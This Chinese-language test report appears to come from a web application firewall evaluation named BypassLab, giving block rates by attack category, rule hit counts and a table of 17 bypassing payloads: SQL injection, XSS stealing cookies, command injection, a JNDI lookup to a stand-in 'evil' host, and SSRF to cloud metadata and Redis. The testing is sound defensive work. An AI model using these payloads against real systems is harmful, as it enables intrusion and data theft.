# BypassLab 对抗矩阵报告

- 样本总数：108（攻击 84 / 良性 24）
- 攻击拦截率：**79.8%**（67/84）
- 良性误报率：**0.0%**（0/24）
- 执行错误：0

## 分类拦截率

| 类别 | 拦截/总数 | 拦截率 |
|---|---|---|
| benign | 0/24 | 0% |
| deserialization | 8/10 | 80% |
| path-traversal | 10/10 | 100% |
| rce | 10/12 | 83% |
| scanner | 8/8 | 100% |
| sqli | 18/21 | 86% |
| ssrf | 1/8 | 12% |
| xss | 12/15 | 80% |

## 命中规则分布

| 规则 | 次数 |
|---|---|
| BL-SQLI-001 | 10 |
| BL-SCAN-001 | 8 |
| BL-TRAV-001 | 7 |
| BL-RCE-001 | 6 |
| BL-XSS-001 | 6 |
| BL-DESER-001 | 5 |
| BL-TRAV-002 | 5 |
| BL-XSS-002 | 5 |
| SEM-sql:comment-stripped+sql:tautology | 4 |
| BL-DESER-002 | 3 |
| BL-RCE-002 | 3 |
| BL-SQLI-002 | 2 |
| BL-SQLI-003 | 2 |
| SEM-xss:js-uri+xss:script-tag | 1 |

## 绕过清单（17 条，W3 补规则的输入）

| 样本 | 类别 | 名称 | 载荷（截断） |
|---|---|---|---|
| W2-SQLI-010 | sqli | 基础型 10 | `id=1%27+AND+%271%27%3D%271%27+--` |
| W2-SQLI-011 | sqli | 基础型 11 | `id=1%3B+DROP+TABLE+users--` |
| W2-SQLI-014 | sqli | 基础型 14 | `id=1+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fshell.php%27` |
| W2-XSS-007 | xss | 基础型 7 | `c=javascript%3Aalert%28document.cookie%29` |
| W2-XSS-008 | xss | 基础型 8 | `c=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa…` |
| W2-XSS-010 | xss | 基础型 10 | `c=%3Cdetails+open+ontoggle%3Dalert%281%29%3E` |
| W2-RCE-002 | rce | 基础型 2 | `host=1.1.1.1%7Cwhoami` |
| W2-RCE-009 | rce | 基础型 9 | `host=%3Bpowershell+-c+whoami` |
| W2-DESER-004 | deserialization | JNDI 变体 4 | `${${lower:j}ndi:ldap://evil/a}` |
| W2-DESER-008 | deserialization | Java 序列化魔数 | `rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==` |
| W2-SSRF-001 | ssrf | 基础型 1 | `url=http%3A%2F%2F127.0.0.1%3A6379%2F` |
| W2-SSRF-002 | ssrf | 基础型 2 | `url=http%3A%2F%2Flocalhost%3A8080%2Fadmin` |
| W2-SSRF-003 | ssrf | 基础型 3 | `url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F` |
| W2-SSRF-004 | ssrf | 基础型 4 | `url=http%3A%2F%2F0.0.0.0%3A22%2F` |
| W2-SSRF-006 | ssrf | 基础型 6 | `url=http%3A%2F%2F%5B%3A%3A1%5D%3A80%2F` |
| W2-SSRF-007 | ssrf | 基础型 7 | `url=http%3A%2F%2F127.0.0.1.nip.io%2F` |
| W2-SSRF-008 | ssrf | 基础型 8 | `url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_INFO` |
